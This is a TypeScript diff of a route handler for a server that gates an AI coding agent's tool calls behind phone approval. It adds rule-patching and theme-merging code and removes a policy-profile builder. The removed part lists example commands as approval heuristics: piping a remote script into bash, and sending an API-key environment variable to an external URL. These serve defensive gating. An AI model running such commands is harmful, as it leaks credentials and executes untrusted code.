+      getDataDir?: () => string;
+    };
+    const dataDir = storageWithDataDir.getDataDir?.() ?? process.cwd();
+    const sandboxesDir = join(dataDir, "sandboxes");
+    return existsSync(sandboxesDir) ? sandboxesDir : dataDir;
+  }
+
   private loadSessionTrace(session: Session, traceView: TraceViewMode = "context") {
-    const sandboxBaseDir = this.ctx.sandbox.getBaseDir();
+    const sandboxBaseDir = this.legacySandboxBaseDir();
     let trace = readSessionTrace(sandboxBaseDir, session.id, session.workspaceId, {
       view: traceView,
     });
@@ -1492,43 +1541,11 @@ export class RouteHandler {
       ? this.ctx.storage.getWorkspace(session.workspaceId)
       : undefined;
 
-    if (session.runtime === "container") {
-      if (workspace?.hostMount) {
-        const resolved = workspace.hostMount.replace(/^~/, homedir());
-        return existsSync(resolved) ? resolved : null;
-      }
-      if (!session.workspaceId) {
-        return null;
-      }
-
-      const workspaceSandbox = join(
-        this.ctx.sandbox.getBaseDir(),
-        session.workspaceId,
-        "workspace",
-      );
-      return existsSync(workspaceSandbox) ? workspaceSandbox : null;
-    }
-
     if (workspace?.hostMount) {
       const resolved = workspace.hostMount.replace(/^~/, homedir());
       return existsSync(resolved) ? resolved : null;
     }
     return homedir();
-  }
-
-  private isValidPolicyPreset(value: string): value is PolicyPresetName {
-    return Object.prototype.hasOwnProperty.call(PRESETS, value);
-  }
-
-  private resolvePolicyPresetName(
-    raw: string | undefined,
-    runtime: "host" | "container",
-  ): PolicyPresetName {
-    if (raw && this.isValidPolicyPreset(raw)) {
-      return raw;
-    }
-
-    return runtime === "container" ? "container" : "host";
   }
 
   private isRuleVisibleToUser(rule: LearnedRule): boolean {
@@ -1555,131 +1572,6 @@ export class RouteHandler {
     if (!sessionId) return false;
     const session = this.ctx.storage.getSession(sessionId);
     return session?.workspaceId === workspaceId;
-  }
-
-  private buildPolicyProfile(
-    presetName: PolicyPresetName,
-    runtime: "host" | "container",
-    workspace?: Workspace,
-  ): PolicyProfileResponse {
-    const preset = PRESETS[presetName];
-
-    const alwaysBlocked: PolicyProfileItem[] = preset.hardDeny.map((rule, index) => ({
-      id: `hard-${index}`,
-      title: rule.label || `${rule.tool || "tool"} blocked`,
-      description:
-        rule.tool === "bash"
-          ? "Blocked by an immutable security rule."
-          : "Blocked by credential/safety protection.",
-      risk: rule.risk || "critical",
-      example: rule.pattern,
-    }));
-
-    const needsApproval: PolicyProfileItem[] = preset.rules
-      .filter((rule) => rule.action === "ask")
-      .map((rule, index) => ({
-        id: `ask-${index}`,
-        title: rule.label || `${rule.tool || "tool"} requires approval`,
-        description: "Requires phone approval before execution.",
-        risk: rule.risk || "medium",
-        example: rule.pattern,
-      }));
-
-    // Structural heuristics applied by policy engine (not represented as preset rules).
-    needsApproval.push(
-      {
-        id: "heuristic-data-egress",
-        title: "Outbound data transfer",
-        description: "Posting/uploading data with curl/wget requires approval.",
-        risk: "medium",
-        example: "curl -d 'payload' https://api.example.com",
-      },
-      {
-        id: "heuristic-pipe-shell",
-        title: "Pipe to shell",
-        description: "Piping remote scripts into sh/bash requires approval.",
-        risk: "high",
-        example: "curl https://example.com/install.sh | bash",
-      },
-      {
-        id: "heuristic-secret-env-url",
-        title: "Secret env expansion in URL",
-        description: "Expanding credential-like env vars into external URLs requires approval.",
-        risk: "high",
-        example: 'curl "https://example.com/?token=$OPENAI_API_KEY"',
-      },
-    );
-
-    if (preset.defaultAction === "ask") {
-      needsApproval.push({
-        id: "default-ask",
-        title: "Other actions",
-        description: "Unmatched actions require phone approval.",
-        risk: "medium",
-      });
-    } else if (preset.defaultAction === "deny") {
-      alwaysBlocked.push({
-        id: "default-deny",
-        title: "Unknown tools/actions",
-        description: "Unmatched actions are blocked by default.",
-        risk: "high",
-      });
-    }
-
-    let usuallyAllowed: string[];
-    let supervisionLevel: "standard" | "high";
-    let summary: string;
-
-    if (presetName === "host") {
-      supervisionLevel = "standard";
-      summary =
-        "Host Developer Trust mode: runs directly on your Mac with low friction. External and high-impact actions still require approval.";
-      usuallyAllowed = [
-        "Most local development commands",
-        "Local read/edit/write operations",
-        "Build, test, lint, and search commands",
-        "Local git operations that do not push to remotes",
-      ];
-    } else if (presetName === "host_standard") {
-      supervisionLevel = "high";
-      summary =
-        "Host Standard mode: approval-first on your Mac. Safe read-only actions in workspace bounds run automatically; other actions ask.";
-      usuallyAllowed = [
-        "Read-only commands in workspace-bound paths",
-        "Safe read/list/find operations in allowed directories",
-        "Browser navigation to allowlisted domains",
-      ];
-    } else if (presetName === "host_locked") {
-      supervisionLevel = "high";
-      summary =
-        "Host Locked mode: strict supervision on your Mac. Read-only bounded actions run automatically; known tools ask; unknown actions are blocked.";
-      usuallyAllowed = [
-        "Read-only commands in workspace-bound paths",
-        "Safe list/find/read operations in allowed directories",
-      ];
-    } else {
-      supervisionLevel = "standard";
-      summary =
-        "Container mode: runs in an isolated environment. Most local container actions run automatically; external/destructive actions may require approval.";
-      usuallyAllowed = [
-        "Most filesystem/tool operations inside the container",
-        "Build, test, lint, and search commands in workspace",
-        "Local git operations in container (push still needs approval)",
-      ];
-    }
-
-    return {
-      workspaceId: workspace?.id,
-      workspaceName: workspace?.name,
-      runtime,
-      policyPreset: presetName,
-      supervisionLevel,
-      summary,
-      generatedAt: Date.now(),
-      alwaysBlocked,
-      needsApproval,
-      usuallyAllowed,
-    };
   }
 
   private handleGetUserStreamEvents(url: URL, res: ServerResponse): void {
@@ -1732,7 +1624,6 @@ export class RouteHandler {
         tool: decision.tool,
         input: decision.input,
         displaySummary: decision.displaySummary,
-        risk: decision.risk,
         reason: decision.reason,
         timeoutAt: decision.timeoutAt,
         expires: decision.expires ?? true,
@@ -1743,25 +1634,6 @@ export class RouteHandler {
       pending,
       serverTime,
     });
-  }
-
-  private handleGetPolicyProfile(url: URL, res: ServerResponse): void {
-    const workspaceId = url.searchParams.get("workspaceId") || undefined;
-
-    let workspace: Workspace | undefined;
-    if (workspaceId) {
-      workspace = this.ctx.storage.getWorkspace(workspaceId);
-      if (!workspace) {
-        this.error(res, 404, "Workspace not found");
-        return;
-      }
-    }
-
-    const runtime: "host" | "container" = workspace?.runtime ?? "host";
-    const policyPreset = this.resolvePolicyPresetName(workspace?.policyPreset, runtime);
-    const profile = this.buildPolicyProfile(policyPreset, runtime, workspace);
-
-    this.json(res, { profile });
   }
 
   private handleGetPolicyRules(url: URL, res: ServerResponse): void {
@@ -1804,8 +1676,176 @@ export class RouteHandler {
     this.json(res, { rules });
   }
 
+  private async handlePatchPolicyRule(
+    path: string,
+    req: IncomingMessage,
+    res: ServerResponse,
+  ): Promise<void> {
+    const ruleId = decodeURIComponent(path.split("/").pop() || "");
+    if (!ruleId) {
+      this.error(res, 400, "Missing rule ID");
+      return;
+    }
+
+    // Verify rule exists and belongs to this user
+    const allRules = this.ctx.gate.ruleStore.getAll();
+    const existing = allRules.find((r) => r.id === ruleId);
+    if (!existing || !this.isRuleVisibleToUser(existing)) {
+      this.error(res, 404, "Rule not found");
+      return;
+    }
+
+    const body = await this.parseBody<{
+      effect?: unknown;
+      description?: unknown;
+      tool?: unknown;
+      match?: unknown;
+      expiresAt?: unknown;
+    }>(req);
+
+    const hasField = (key: string): boolean => Object.prototype.hasOwnProperty.call(body, key);
+    const hasPatchField =
+      hasField("effect") ||
+      hasField("description") ||
+      hasField("tool") ||
+      hasField("match") ||
+      hasField("expiresAt");
+
+    if (!hasPatchField) {
+      this.error(res, 400, "At least one patch field is required");
+      return;
+    }
+
+    const updates: {
+      effect?: LearnedRule["effect"];
+      tool?: LearnedRule["tool"] | null;
+      match?: LearnedRule["match"];
+      description?: string;
+      expiresAt?: number | null;
+    } = {};
+
+    if (hasField("effect")) {
+      if (body.effect !== "allow" && body.effect !== "deny") {
+        this.error(res, 400, 'effect must be "allow" or "deny"');
+        return;
+      }
+      updates.effect = body.effect;
+    }
+
+    if (hasField("description")) {
+      if (typeof body.description !== "string") {
+        this.error(res, 400, "description must be a string");
+        return;
+      }
+      const trimmed = body.description.trim();
+      if (!trimmed) {
+        this.error(res, 400, "description cannot be empty");
+        return;
+      }
+      updates.description = trimmed;
+    }
+
+    if (hasField("tool")) {
+      if (body.tool === null) {
+        updates.tool = null;
+      } else if (typeof body.tool === "string") {
+        const trimmed = body.tool.trim();
+        if (!trimmed) {
+          this.error(res, 400, "tool cannot be empty");
+          return;
+        }
+        updates.tool = trimmed;
+      } else {
+        this.error(res, 400, "tool must be a string or null");
+        return;
+      }
+    }
+
+    if (hasField("match")) {
+      if (!body.match || typeof body.match !== "object" || Array.isArray(body.match)) {
+        this.error(res, 400, "match must be an object");
+        return;
+      }
+
+      const raw = body.match as Record<string, unknown>;
+      const keys = ["executable", "domain", "pathPattern", "commandPattern"] as const;
+      for (const key of keys) {
+        const value = raw[key];
+        if (value !== undefined && typeof value !== "string") {
+          this.error(res, 400, `match.${key} must be a string`);
+          return;
+        }
+      }
+
+      const normalizedMatch: NonNullable<LearnedRule["match"]> = {
+        executable: typeof raw.executable === "string" ? raw.executable.trim() || undefined : undefined,
+        domain: typeof raw.domain === "string" ? raw.domain.trim() || undefined : undefined,
+        pathPattern:
+          typeof raw.pathPattern === "string" ? raw.pathPattern.trim() || undefined : undefined,
+        commandPattern:
+          typeof raw.commandPattern === "string"
+            ? raw.commandPattern.trim() || undefined
+            : undefined,
+      };
+
+      const hasMatchCondition = Boolean(
+        normalizedMatch.executable ||
+          normalizedMatch.domain ||
+          normalizedMatch.pathPattern ||
+          normalizedMatch.commandPattern,
+      );
+
+      if (!hasMatchCondition) {
+        this.error(res, 400, "match must include at least one condition");
+        return;
+      }
+
+      updates.match = normalizedMatch;
+    }
+
+    if (hasField("expiresAt")) {
+      if (body.expiresAt === null) {
+        updates.expiresAt = null;
+      } else if (typeof body.expiresAt === "number" && Number.isFinite(body.expiresAt)) {
+        const timestamp = Math.trunc(body.expiresAt);
+        if (timestamp <= 0) {
+          this.error(res, 400, "expiresAt must be a positive timestamp or null");
+          return;
+        }
+        updates.expiresAt = timestamp;
+      } else {
+        this.error(res, 400, "expiresAt must be a number or null");
+        return;
+      }
+    }
+
+    const finalTool =
+      updates.tool !== undefined ? (updates.tool === null ? undefined : updates.tool) : existing.tool;
+    const finalMatch = updates.match !== undefined ? updates.match : existing.match;
+    const hasFinalMatchCondition = Boolean(
+      finalMatch?.executable ||
+        finalMatch?.domain ||
+        finalMatch?.pathPattern ||
+        finalMatch?.commandPattern,
+    );
+
+    if ((!finalTool || finalTool === "*") && !hasFinalMatchCondition) {
+      this.error(res, 400, "rule must include a specific tool or match condition");
+      return;
+    }
+
+    const updated = this.ctx.gate.ruleStore.update(ruleId, updates);
+    if (!updated) {
+      this.error(res, 500, "Failed to update rule");
+      return;
+    }
+
+    console.log(`[policy] Rule ${ruleId} updated: ${updated.description}`);
+    this.json(res, { rule: updated });
+  }
+
   private handleDeletePolicyRule(path: string, res: ServerResponse): void {
-    const ruleId = path.split("/").pop();
+    const ruleId = decodeURIComponent(path.split("/").pop() || "");
     if (!ruleId) {
       this.error(res, 400, "Missing rule ID");
       return;
@@ -1939,7 +1979,7 @@ export class RouteHandler {
 
     const traceView = this.resolveTraceView(url);
     const hydratedSession = this.ctx.ensureSessionContextWindow(session);
-    const sandboxBaseDir = this.ctx.sandbox.getBaseDir();
+    const sandboxBaseDir = this.legacySandboxBaseDir();
 
     let trace = this.loadSessionTrace(hydratedSession, traceView);
 
@@ -1990,33 +2030,56 @@ export class RouteHandler {
     return join(this.ctx.storage.getDataDir(), "themes");
   }
 
-  private handleListThemes(res: ServerResponse): void {
-    const dir = this.themesDir();
-    if (!existsSync(dir)) {
-      this.json(res, { themes: [] });
-      return;
-    }
-    const themes = readdirSync(dir)
+  /** Bundled theme files shipped with the server. */
+  private bundledThemesDir(): string {
+    return join(import.meta.dirname, "..", "themes");
+  }
+
+  /** Scan a directory for theme JSON files. */
+  private scanThemeDir(
+    dir: string,
+  ): Array<{ name: string; filename: string; colorScheme: string }> {
+    if (!existsSync(dir)) return [];
+    return readdirSync(dir)
       .filter((f) => f.endsWith(".json"))
       .map((f) => {
         try {
           const content = readFileSync(join(dir, f), "utf8");
           const parsed = JSON.parse(content);
           return {
-            name: parsed.name ?? f.replace(/\.json$/, ""),
+            name: (parsed.name as string) ?? f.replace(/\.json$/, ""),
             filename: f.replace(/\.json$/, ""),
-            colorScheme: parsed.colorScheme ?? "dark",
+            colorScheme: (parsed.colorScheme as string) ?? "dark",
           };
         } catch {
           return null;
         }
       })
-      .filter(Boolean);
-    this.json(res, { themes });
+      .filter(
+        (t): t is { name: string; filename: string; colorScheme: string } =>
+          t !== null,
+      );
+  }
+
+  private handleListThemes(res: ServerResponse): void {
+    // Merge bundled + user themes. User themes override bundled by filename.
+    const bundled = this.scanThemeDir(this.bundledThemesDir());
+    const user = this.scanThemeDir(this.themesDir());
+    const byFilename = new Map<
+      string,
+      { name: string; filename: string; colorScheme: string }
+    >();
+    for (const t of bundled) byFilename.set(t.filename, t);
+    for (const t of user) byFilename.set(t.filename, t);
+    this.json(res, { themes: [...byFilename.values()] });
   }
 
   private handleGetTheme(name: string, res: ServerResponse): void {
-    const filePath = join(this.themesDir(), `${name}.json`);
+    // User themes override bundled; fall back to bundled dir.
+    let filePath = join(this.themesDir(), `${name}.json`);
+    if (!existsSync(filePath)) {
+      filePath = join(this.bundledThemesDir(), `${name}.json`);
+    }
     if (!existsSync(filePath)) {
       this.error(res, 404, `Theme "${name}" not found`);
       return;
@@ -2041,9 +2104,14 @@ export class RouteHandler {
       this.error(res, 400, "Missing theme object in body");
       return;
     }
-    // Validate required color fields
+    // Validate required color fields — all 51 pi theme tokens
     const colors = theme.colors as Record<string, string> | undefined;
+    // 49 tokens — maps 1:1 with iOS ThemePalette. Stripped from pi's 51-token
+    // TUI schema: border/borderAccent/borderMuted (TUI box borders),
+    // customMessageBg/customMessageText/customMessageLabel (TUI hook.message,
+    // not in RPC events), selectedBg (no view wired), bashMode (TUI editor).
     const requiredKeys = [
+      // Base palette (13)
       "bg",
       "bgDark",
       "bgHighlight",
@@ -2057,19 +2125,65 @@ export class RouteHandler {
       "purple",
       "red",
       "yellow",
+      "thinkingText",
+      // User message (2)
+      "userMessageBg",
+      "userMessageText",
+      // Tool state (5)
+      "toolPendingBg",
+      "toolSuccessBg",
+      "toolErrorBg",
+      "toolTitle",
+      "toolOutput",
+      // Markdown (10)
+      "mdHeading",
+      "mdLink",
+      "mdLinkUrl",
+      "mdCode",
+      "mdCodeBlock",
+      "mdCodeBlockBorder",
+      "mdQuote",
+      "mdQuoteBorder",
+      "mdHr",
+      "mdListBullet",
+      // Diffs (3)
+      "toolDiffAdded",
+      "toolDiffRemoved",
+      "toolDiffContext",
+      // Syntax (9)
+      "syntaxComment",
+      "syntaxKeyword",
+      "syntaxFunction",
+      "syntaxVariable",
+      "syntaxString",
+      "syntaxNumber",
+      "syntaxType",
+      "syntaxOperator",
+      "syntaxPunctuation",
+      // Thinking levels (6)
+      "thinkingOff",
+      "thinkingMinimal",
+      "thinkingLow",
+      "thinkingMedium",
+      "thinkingHigh",
+      "thinkingXhigh",
     ];
     if (!colors || typeof colors !== "object") {
       this.error(res, 400, "Missing colors object");
       return;
     }
-    const missing = requiredKeys.filter((k) => !colors[k]);
+    const missing = requiredKeys.filter((k) => !(k in colors));
     if (missing.length > 0) {
       this.error(res, 400, `Missing color keys: ${missing.join(", ")}`);
       return;
     }
-    // Validate hex format
+    // Validate hex format (empty string "" allowed = "use default")
     for (const [key, value] of Object.entries(colors)) {
-      if (typeof value !== "string" || !/^#[0-9a-fA-F]{6}$/.test(value)) {
+      if (typeof value !== "string") {
+        this.error(res, 400, `Invalid color value for "${key}": expected string`);
+        return;
+      }
+      if (value !== "" && !/^#[0-9a-fA-F]{6}$/.test(value)) {
         this.error(res, 400, `Invalid hex color for "${key}": ${value}`);
         return;
       }
